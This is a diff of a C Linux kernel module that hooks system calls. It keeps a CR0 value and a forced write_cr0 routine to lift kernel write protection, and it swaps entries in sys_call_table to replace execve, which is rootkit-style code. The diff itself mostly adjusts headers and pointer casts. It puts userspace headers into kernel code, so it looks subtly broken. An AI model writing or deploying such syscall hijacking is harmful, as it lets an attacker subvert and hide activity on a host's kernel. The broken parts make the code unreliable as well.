@@ -1,14 +1,19 @@
+#define _GNU_SOURCE
+#include<unistd.h>
+#include<linux/init.h>
 #include<linux/kernel.h>
 #include<linux/module.h>
 //#include<linux/syscalls.h>
 #include<linux/version.h>
 //#include<linux/proc_ns.h>
-//#include<sys/types.h>
-#include<linux/unistd.h>
+#include<sys/types.h>
+
+//#include<linux/unistd.h>
+//#include<unistd_32.h>
 // execve("/usr/bin/bash", ["bash"], 0x7fff23adffb0 /* 42 vars */) = 0
 
 unsigned long cr0, orig_cr0;
-void (* force)(unsigned long) = NULL;
+void * force = NULL;
 long ret;
 char *cmd[2] = { "eject", (char *)0 };
 char *env[1] = { NULL };
@@ -36,7 +41,7 @@ static inline void write_cr0_forced(unsigned long val)
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16 ,0)
-    force = &write_cr0_forced;
+    force = (unsigned long *)&write_cr0_forced;
 #endif
 
 asmlinkage long (*orig_execve)(const char *pathname, char *const argv[], char *const envp[]);
@@ -49,7 +54,7 @@ hooking_syscall(void *hook_addr, uint16_t syscall_offset, unsigned long *sys_cal
     protect_memory();
 }
 
-unhooking_syscall(void *orig_addr, u_int16_t syscall_offset, unsigned long *sys_call_table)
+unhooking_syscall(void *orig_addr, __u_int16_t syscall_offset, unsigned long *sys_call_table)
 {
     unprotect_memory();
     sys_call_table[syscall_offset] = (unsigned long) orig_addr;
